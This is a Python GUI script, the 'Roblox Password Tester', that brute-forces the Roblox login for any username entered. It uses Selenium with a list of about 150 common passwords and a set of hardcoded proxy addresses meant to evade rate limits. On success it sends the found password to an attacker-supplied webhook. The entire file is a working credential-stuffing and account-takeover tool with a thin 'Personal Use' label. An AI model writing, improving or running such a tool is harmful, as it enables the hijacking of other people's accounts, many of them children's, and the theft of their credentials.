import sys
import time
import random
import requests
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from PyQt5.QtWidgets import (QApplication, QWidget, QVBoxLayout, QLabel, QLineEdit, QPushButton, QMessageBox)
from PyQt5.QtCore import Qt


default_passwords = [
    "database1", "12345678", "letmein123", "roblox1234", "dragon123", "guest1234", 
    "admin1234", "hello1234", "iloveyou1", "welcome123", "monkey123", "abc12345", "1q2w3e4r5t", 
    "sunshine1", "password1", "adminadmin", "blink182!", "superman1", "trustno1!", "football1", 
    "baseball1", "batman123", "shadow123", "master123", "freedom12", "123456789", "adminpass1", 
    "administrator", "passw0rd!", "p@ssw0rd1", "qwerty123", "login1234", "access123", "123qweasd", 
    "myspace1!", "zaq12wsx3", "abc12345!", "princess1", "welcome12", "hello2023", "whatever1", 
    "jordan23!", "mustang12", "harley123", "hunter123", "michael1", "computer1", "secret123", 
    "freedom12", "money1234", "password2", "iloveyou2", "admin2023", "welcome1!", "hello1234", 
    "summer23!", "fall2023!", "winter23!", "spring23!", "test1234", "demo1234", "temp1234", 
    "changeme!", "default12", "guest1234", "user1234", "example1", "sample123", "pass1234", 
    "mypassword", "simplepass", "letmein!", "welcome!", "password!", "adminroot", "adminpass", 
    "rootadmin", "admin2023", "password!", "root1234", "admin1234", "default12", "guest2023", 
    "temporary1", "testing12", "testpass1", "demoaccount", "temporary", "samplepass", "sample123", 
    "example12", "backup123", "control1!", "config123", "service1!", "support1!", "access12", 
    "server123", "database1", "monitor12", "testtest1", "testing12", "developer", "readonly1", 
    "manager1!", "security1", "firewall1", "network1!", "password9", "simple123", "password0", 
    "adminuser", "userpass1", "manager12", "employee1", "client123", "partner12", "contract1", 
    "agreement", "register1", "session12", "validate1", "confirm12", "activate1", "premium1!", 
    "standard1", "basic1234", "default22", "guest2024", "visitor12", "account1!", "session22", 
    "connect1!", "binding12", "request1!", "response1", "server123", "database2", "monitor22", 
    "backup123", "control22", "config123", "service22", "support22", "access222"
]


proxies = [
    "154.65.39.7:80", "154.65.39.8:80", "148.230.195.165:6969", "2.179.193.146:80",
    "168.132.150.37:8080", "86.77.217.16:8081", "31.62.179.218:5472", "185.105.182.189:80",
    "103.179.252.167:8181", "103.191.115.252:82", "181.78.21.74:999", "181.78.21.38:999",
    "8.28.152.111:80", "103.158.162.18:8000"
]

chrome_driver_path = "chromedriver.exe"

class InputWindow(QWidget):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Roblox Password Tester")
        self.setFixedSize(600, 400)
        self.setStyleSheet("background-color: #0f0f17; color: #A855F7; font-size: 18px;")

        layout = QVBoxLayout()
        layout.setAlignment(Qt.AlignCenter)

        self.webhookInput = QLineEdit()
        self.webhookInput.setPlaceholderText("Enter Webhook URL...")
        self.webhookInput.setStyleSheet("background-color: #0f0f17; color: #A855F7; padding: 10px;")

        self.usernameInput = QLineEdit()
        self.usernameInput.setPlaceholderText("Enter Roblox Username...")
        self.usernameInput.setStyleSheet("background-color: #0f0f17; color: #A855F7; padding: 10px;")

        self.startButton = QPushButton("Start BruteForce (Personal Use)")
        self.startButton.setStyleSheet("background-color: #A855F7; color: white; padding: 15px; font-size: 22px;")
        self.startButton.clicked.connect(self.start_brute)

        layout.addWidget(QLabel("Webhook URL:"), alignment=Qt.AlignCenter)
        layout.addWidget(self.webhookInput, alignment=Qt.AlignCenter)
        layout.addWidget(QLabel("Roblox Username:"), alignment=Qt.AlignCenter)
        layout.addWidget(self.usernameInput, alignment=Qt.AlignCenter)
        layout.addWidget(self.startButton, alignment=Qt.AlignCenter)

        self.setLayout(layout)

    def start_brute(self):
        webhook_url = self.webhookInput.text().strip()
        username = self.usernameInput.text().strip()

        if not webhook_url or not username:
            QMessageBox.warning(self, "Error", "Please fill both fields.")
            return

        passwords = default_passwords.copy()
        proxy_index = 0
        tries_since_last_proxy = 0

        def get_new_driver():
            options = Options()
            options.add_argument('--incognito')
            options.add_argument('--disable-extensions')
            #ZYRES TOOL
            return webdriver.Chrome(service=Service(chrome_driver_path), options=options)

        driver = get_new_driver()
        print(f"🔌 Using proxy: {proxies[proxy_index]}")

        for index, password in enumerate(passwords):
            try:
                if tries_since_last_proxy >= 3:
                    driver.quit()
                    proxy_index = (proxy_index + 1) % len(proxies)
                    driver = get_new_driver()
                    print(f"🔁 Rotated to new proxy: {proxies[proxy_index]}")
                    tries_since_last_proxy = 0

                driver.get("https://www.roblox.com/Login")
                time.sleep(2)

                username_box = driver.find_element(By.ID, "login-username")
                password_box = driver.find_element(By.ID, "login-password")
                login_button = driver.find_element(By.ID, "login-button")

                username_box.clear()
                password_box.clear()

                username_box.send_keys(username)
                password_box.send_keys(password)
                login_button.click()

                time.sleep(3)

                if "home" in driver.current_url.lower():
                    print(f"✅ SUCCESS with password: {password}")
                    if webhook_url:
                        try:
                            requests.post(webhook_url, json={"content": f"✅ Logged in successfully! Password: {password}"})
                        except Exception as e:
                            print(f"Webhook error: {e}")
                    driver.quit()
                    return

                else:
                    print(f"❌ Failed attempt with: {password}")
                    driver.get("https://www.roblox.com/Login")
                    time.sleep(2)

                tries_since_last_proxy += 1
                time.sleep(random.uniform(2, 4))

            except Exception as e:
                print(f"⚠️ Error during attempt: {e}")
                try:
                    driver.get("https://www.roblox.com/Login")
                except:
                    pass
                time.sleep(2)

        driver.quit()
        print("🔚 Finished all password attempts.")

if __name__ == '__main__':
    app = QApplication(sys.argv)
    window = InputWindow()
    window.show()
    sys.exit(app.exec_())